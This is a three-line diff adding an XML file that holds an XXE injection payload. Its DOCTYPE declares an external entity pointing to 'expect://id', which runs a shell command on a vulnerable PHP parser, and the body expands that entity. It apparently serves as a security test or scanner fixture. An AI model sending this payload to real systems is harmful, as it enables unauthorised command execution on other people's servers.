@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "expect://id">]>
+<r><meta name="description" content="ZKR6"/>&xxe;</r>
